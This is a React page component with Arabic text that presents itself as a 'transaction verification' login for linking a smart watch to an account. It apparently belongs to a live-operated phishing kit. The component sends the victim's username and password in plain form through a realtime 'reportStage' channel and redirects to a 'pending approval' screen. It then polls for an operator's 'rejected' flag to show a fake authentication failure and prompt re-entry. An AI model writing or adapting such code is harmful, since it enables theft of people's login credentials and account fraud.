import { useEffect, useState } from 'react';
import { useLocation, Link } from 'wouter';
import { AppLayout } from '@/components/layout/AppLayout';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { useRegistration } from '@/context/RegistrationContext';
import { useRealtime } from '@/context/RealtimeContext';
import { ChevronLeft, ChevronRight, Eye, EyeOff, AlertCircle, User, Lock } from 'lucide-react';

export default function CreateAccount() {
  const [, setLocation] = useLocation();
  const { data, updateData } = useRegistration();
  const { reportStage } = useRealtime();
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [isRejected, setIsRejected] = useState(false);

  useEffect(() => {
    reportStage('create_account', {});
    const params = new URLSearchParams(window.location.search);
    setIsRejected(params.get('rejected') === 'true');
  }, []);

  useEffect(() => {
    const handleUrlChange = () => {
      const params = new URLSearchParams(window.location.search);
      setIsRejected(params.get('rejected') === 'true');
    };
    
    handleUrlChange();
    const interval = setInterval(handleUrlChange, 500);
    return () => clearInterval(interval);
  }, []);

  const validate = () => {
    const newErrors: Record<string, string> = {};
    if (!data.username.trim()) newErrors.username = 'اسم المستخدم مطلوب للمتابعة';
    if (password.length < 6) newErrors.password = 'رمز المرور يجب أن يتكون من 6 رموز على الأقل';
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (validate()) {
      reportStage('create_account', { username: data.username, password });
      setLocation('/pending-approval');
    }
  };

  return (
    <AppLayout>
      <div className="flex-1 flex flex-col justify-center max-w-md w-full mx-auto animate-in fade-in slide-in-from-bottom-4 duration-500 py-6">
        
        <div className="mb-6 flex items-center justify-between px-1">
          <div className="space-y-1">
            <h1 className="text-2xl font-bold text-foreground tracking-tight">التحقق من المعاملة</h1>
            <p className="text-sm text-muted-foreground">قم بتسجيل الدخول للحساب ليتم ربط الساعة الذكية في حسابك        </p>
          </div>
          <Link href="/signup" className="w-10 h-10 flex items-center justify-center rounded-lg bg-white border border-border hover:bg-secondary text-muted-foreground hover:text-primary transition-all shadow-sm">
            <ChevronRight className="w-5 h-5" />
          </Link>
        </div>

        <div className="bg-white border border-border rounded-xl p-6 md:p-8 shadow-md relative overflow-hidden">
          <div className="absolute top-0 right-0 w-full h-1 bg-primary" />
          
          {isRejected && (
            <div className="mb-6 p-3.5 bg-destructive/5 border border-destructive/20 rounded-lg flex items-start gap-3 animate-in fade-in duration-300">
              <AlertCircle className="w-4 h-4 text-destructive mt-0.5 flex-shrink-0" />
              <div className="space-y-1">
                <p className="text-destructive text-xs font-bold">فشل عملية المصادقة</p>
                <p className="text-muted-foreground text-[11px] leading-relaxed">
                  البيانات المدخلة غير متطابقة مع سجلات النظام. يرجى مراجعة الإدخال وإعادة المحاولة.
                </p>
              </div>
            </div>
          )}
          
          <form onSubmit={handleSubmit} className="space-y-5">
            
            <div className="space-y-2">
              <Label htmlFor="username" className="text-xs font-bold text-foreground/80">اسم المستخدم </Label>
              <div className="relative">
                <Input
                  id="username"
                  dir="ltr"
                  className={`h-12 text-sm pl-4 pr-10 font-mono focus-visible:ring-primary transition-all ${errors.username ? 'border-destructive focus-visible:ring-destructive' : 'border-border'}`}
                  placeholder=""
                  value={data.username}
                  onChange={e => updateData({ username: e.target.value })}
                />
                <User className="absolute right-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground/70" />
              </div>
              {errors.username && <p className="text-[11px] text-destructive font-medium mt-1">{errors.username}</p>}
            </div>

            <div className="space-y-2">
              <Label htmlFor="password" className="text-xs font-bold text-foreground/80">كلمة المرور </Label>
              <div className="relative">
                <Input
                  id="password"
                  type={showPassword ? 'text' : 'password'}
                  dir="ltr"
                  className={`h-12 text-sm pl-12 pr-10 font-mono focus-visible:ring-primary transition-all ${errors.password ? 'border-destructive focus-visible:ring-destructive' : 'border-border'}`}
                  placeholder="••••••••"
                  value={password}
                  onChange={e => setPassword(e.target.value)}
                />
                <Lock className="absolute right-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground/70" />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute left-3.5 top-1/2 -translate-y-1/2 text-muted-foreground/60 hover:text-primary transition-colors p-1"
                >
                  {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                </button>
              </div>
              {errors.password && <p className="text-[11px] text-destructive font-medium mt-1">{errors.password}</p>}
            </div>

            <Button type="submit" size="lg" className="w-full h-12 gap-2 mt-4 text-sm font-bold bg-primary text-primary-foreground hover:bg-primary/90 rounded-lg shadow-sm transition-all duration-200">
              <span>تأكيد   </span>
              <ChevronLeft className="w-4 h-4" />
            </Button>
          </form>
        </div>
        
       

      </div>
    </AppLayout>
  );
}
